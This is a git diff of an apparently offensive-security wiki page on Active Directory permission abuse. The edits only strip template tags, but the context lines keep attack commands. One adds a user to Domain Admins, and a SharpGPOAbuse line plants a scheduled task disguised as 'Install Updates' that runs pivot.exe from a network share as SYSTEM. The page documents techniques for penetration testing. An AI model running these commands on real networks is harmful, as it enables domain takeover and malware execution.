@@ -115,9 +115,9 @@ Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.
 * If you have these privs over a user, you can use one of the [first methods explained in this page](./#genericall-on-user).
 * Or, either you have it in a Computer or a user you can use **Shadow Credentials** to impersonate it:
 
-{% content-ref url="shadow-credentials.md" %}
+
 [shadow-credentials.md](shadow-credentials.md)
-{% endcontent-ref %}
+
 
 ## WriteProperty on Group
 
@@ -390,9 +390,9 @@ The above will add our user spotless to the local `administrators` group of the 
 
 ### GroupPolicy module **- Abuse GPO**
 
-{% hint style="info" %}
+
 You can check to see if the GroupPolicy module is installed with `Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`. In a pinch, you can install it with `Install-WindowsFeature –Name GPMC` as a local admin.
-{% endhint %}
+
 
 ```powershell
 # Create new GPO and link it with the OU Workstrations
@@ -406,9 +406,9 @@ This payload, after the GPO is updated, will need also someone to login inside t
 
 ### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- Abuse GPO**
 
-{% hint style="info" %}
+
 It cannot create GPOs, so we must still do that with RSAT or modify one we already have write access to.
-{% endhint %}
+
 
 ```bash
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
